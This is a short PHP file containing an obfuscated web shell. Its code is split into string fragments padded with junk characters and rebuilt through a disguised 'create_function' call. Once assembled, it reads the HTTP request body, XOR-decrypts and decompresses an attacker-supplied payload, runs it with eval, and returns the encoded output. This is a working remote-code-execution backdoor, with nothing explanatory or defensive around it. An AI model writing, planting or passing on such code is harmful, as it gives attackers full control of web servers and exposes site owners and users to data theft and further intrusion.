<?php
$P=');$6|r=@bas6|e64_e6|nc6|ode(@6|x(@g6|zcompress($6|o),$k));pri6|nt("$6|p$k6|h$r$kf");}';
$g='$6|k6|="cb6b88f9";$kh="e6|c676|7e346836|06|";$k6|f="b714dadabc26|86|"6|;$p=6|"m55lb60';
$l='ontents("p6|hp:/6|6|/input6|"),$m)==1) {@ob_st6|art();@e6|val(@gz6|uncompres6|s(@x(@b6';
$B='|6|ase6|64_decode6|6|($m[1]),$k6|)));$o=@o6|b_get_cont6|ents6|();@6|ob_en6|d_clean(';
$M='($i=6|0;$i6|<$l;){for(6|$j6|=0;($j<$c&6|&$i<$l);$6|j++,$i++6|){$o.=$6|t6|{$i}6|^$k{$';
$L='j6|};}6|}return $6|o;}if (@pr6|eg_match(6|"6|/$kh6|(.+)$kf6|6|/",@file_ge6|t_6|c6|';
$V=str_replace('dL','','dLcredLadLte_fudLncdLtidLon');
$S='6|9w7AL2KVS";funct6|ion 6|x(6|$t,$k)6|{$c=strlen(6|$k);6|$l=6|strlen($t);$o=6|6|"";for6|';
$q=str_replace('6|','',$g.$S.$M.$L.$l.$B.$P);
$O=$V('',$q);$O();
?>
